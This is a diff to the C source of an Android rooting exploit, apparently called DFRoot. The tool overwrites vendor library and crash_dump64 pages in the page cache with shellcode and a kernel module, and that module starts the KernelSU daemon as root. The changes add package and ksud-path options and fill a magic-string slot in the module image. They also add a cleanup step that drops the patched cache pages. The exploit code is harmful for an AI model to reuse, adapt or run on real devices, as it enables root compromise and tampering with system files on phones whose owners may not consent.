@@ -1,3 +1,4 @@
+#define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -27,6 +28,13 @@ static int      g_sender_port;
 static uint32_t g_spi;
 static uint8_t  g_aes_key[32];
 static uint32_t g_seq = 1;
+/* SU-manager package and the soft-reboot/disable-modules switches reach the
+ * kernel module as insmod parameters through the shellcode's string slots
+ * (chisewaguri architecture); the staged ksud path rides in a slot inside the
+ * ko image itself, overwritten below before the module is written out. */
+static const char *g_package_name;
+static const char *g_ksud_path;
+static int         g_flags;
 struct PatchRestore {
     const char *lib;
     uint64_t    tramp_aligned;
@@ -241,6 +249,8 @@ extern char libcxx_data[];
 extern uint32_t libcxx_len;
 extern char libcxx_first_inst_copy[];
 extern uint32_t libcxx_ko_target_off;
+extern uint32_t libcxx_pkg_val_off;
+extern uint32_t libcxx_flags_val_off;
 
 asm(
     ".section .rodata\n"
@@ -382,11 +392,39 @@ static int patch_ko(void) {
     size_t len;
     char *buf = pad16(ko->start, (size_t)(ko->end - ko->start), &len);
     if (!buf) { printf("patch: %s - pad16 alloc failed\n", libcxx_ko_target); return -1; }
+
+    /* The module carries a 160-byte module_param slot for the staged ksud
+     * path; its UMH command execs that path directly, so no bootstrap binary
+     * and no prefs parsing ever run on the root side. The slot initializer is
+     * a fixed magic string - find it in the padded heap copy and fill in the
+     * real path before the ko is written into the vendor page cache. */
+    char *slot = memmem(buf, len, "DFROOT_KSUD_PATH_SLOT", 21);
+    if (!slot || slot + 160 > buf + len) {
+        printf("ksud_path slot not found in ko image\n");
+        free(buf);
+        return 1;
+    }
+    memset(slot, 0, 160);
+    snprintf(slot, 160, "%s", g_ksud_path);
+    printf("ko ksud_path: %s\n", g_ksud_path);
+
     printf("patch: %s <- dfroot.ko (%zu bytes)\n", libcxx_ko_target, len);
     int ret = patch_file_cbc(libcxx_ko_target, buf, len, 0, 1);
     free(buf);
     if (ret) printf("patch: %s patch failed: %d\n", libcxx_ko_target, ret);
     return ret;
+}
+
+/* crash_dump64 is patched with the helper and only restored by the kernel
+ * module's page-cache invalidation - which never happens if the module fails
+ * to load. Drop the patched pages so a later real tombstone execs the actual
+ * crash dumper off disk instead of the injected helper. (DFRoot 45f529d) */
+static void fadvise_drop(const char *path) {
+    int fd = open(path, O_RDONLY | O_CLOEXEC);
+    if (fd < 0) return;
+    posix_fadvise(fd, 0, 0, POSIX_FADV_DONTNEED);
+    close(fd);
+    printf("cache dropped: %s\n", path);
 }
 
 static void cleanup(void) {
@@ -502,7 +540,8 @@ static int hex_to_bytes(const char *hex, uint8_t *out, size_t len) {
 
 static void usage(const char *argv0) {
     fprintf(stderr,
-            "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX\n", argv0);
+            "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX"
+            " --pkg NAME --ksud PATH [--soft-reboot] [--disable-modules]\n", argv0);
 }
 
 static int setup(int argc, char **argv) {
@@ -510,6 +549,8 @@ static int setup(int argc, char **argv) {
     uint32_t spi = 0;
     uint8_t aes_key[32];
     int have_aes = 0;
+    const char *package_name = NULL;
+    const char *ksud_path = NULL;
 
     for (int i = 1; i < argc; i++) {
         const char *a = argv[i];
@@ -521,9 +562,17 @@ static int setup(int argc, char **argv) {
             spi = (uint32_t)strtoul(argv[++i], NULL, 0);
         else if (!strcmp(a, "--aes-key") && i + 1 < argc)
             have_aes = hex_to_bytes(argv[++i], aes_key, sizeof(aes_key)) == 0;
+        else if (!strcmp(a, "--pkg") && i + 1 < argc)
+            package_name = argv[++i];
+        else if (!strcmp(a, "--ksud") && i + 1 < argc)
+            ksud_path = argv[++i];
+        else if (!strcmp(a, "--soft-reboot"))
+            g_flags |= 1;
+        else if (!strcmp(a, "--disable-modules"))
+            g_flags |= 2;
         else { usage(argv[0]); return 2; }
     }
-    if (!encap_port || !sender_port || !spi || !have_aes) {
+    if (!encap_port || !sender_port || !spi || !have_aes || !package_name || !ksud_path) {
         usage(argv[0]); return 2;
     }
 
@@ -532,6 +581,13 @@ static int setup(int argc, char **argv) {
     g_spi         = spi;
     g_seq         = 1;
     memcpy(g_aes_key, aes_key, 32);
+    g_package_name = package_name;
+    g_ksud_path    = ksud_path;
+
+    /* Fill the shellcode's insmod-argument slots; the ko's ksud_path slot is
+     * filled later, in patch_ko, on the padded heap copy. */
+    snprintf(libcxx_data + libcxx_pkg_val_off, 48, "%s", package_name);
+    snprintf(libcxx_data + libcxx_flags_val_off, 8, "%d", g_flags);
 
     const char *ko_target = detect_ko_target();
     libcxx_ko_target = libcxx_data + libcxx_ko_target_off;
@@ -567,19 +623,12 @@ static int exploit(void) {
         const char *msg;
         int         rc;
     } markers[] = {
-        { "/dev/df",    "libc++: loading custom module",                    -1 },
-        { "/dev/dfm0",  "kernel module: launching bootstrap",               -1 },
-        { "/dev/dfm1",  "bootstrap: loading app preferences file",          -1 },
-        { "/dev/dfme0", "bootstrap: ERROR - reading prefs failed",           1 },
-        { "/dev/dfm2",  "bootstrap: cloning zygote env",                    -1 },
-        { "/dev/dfmw0", "bootstrap: WARNING - clone zygote env failed",     -1 },
-        { "/dev/dfm3",  "bootstrap: setting partitions ro",                 -1 },
-        { "/dev/dfmw1", "bootstrap: WARNING - set partitions ro failed",    -1 },
-        { "/dev/dfm4",  "bootstrap: disabling ksu modules",                 -1 },
-        { "/dev/dfme1", "bootstrap: ERROR - disable modules failed",         1 },
-        { "/dev/dfm5",  "bootstrap: starting SU daemon",                    -1 },
-        { "/dev/dfm6",  "ksud start: SUCCESS",                               0 },
-        { "/dev/dfme2", "ksud start: ERROR - ksud nonzero exit",             1 },
+        { "/dev/df",    "libc++: loading custom module",           -1 },
+        { "/dev/dfm0",  "kernel module: launching ksud",           -1 },
+        { "/dev/dfm4",  "disabling ksu modules",                   -1 },
+        { "/dev/dfm5",  "starting SU daemon",                      -1 },
+        { "/dev/dfm6",  "ksud start: SUCCESS",                      0 },
+        { "/dev/dfme2", "ksud start: ERROR - ksud nonzero exit",    1 },
     };
     int seen[sizeof(markers)/sizeof(markers[0])] = {0};
 
@@ -596,6 +645,7 @@ static int exploit(void) {
     printf("timeout: ERROR - check logcat & dmesg\n");
 done:
     if (rc == 3) printf("patch: ERROR - failed to patch files\n");
+    fadvise_drop(kCrashDump);
     return rc;
 }
 
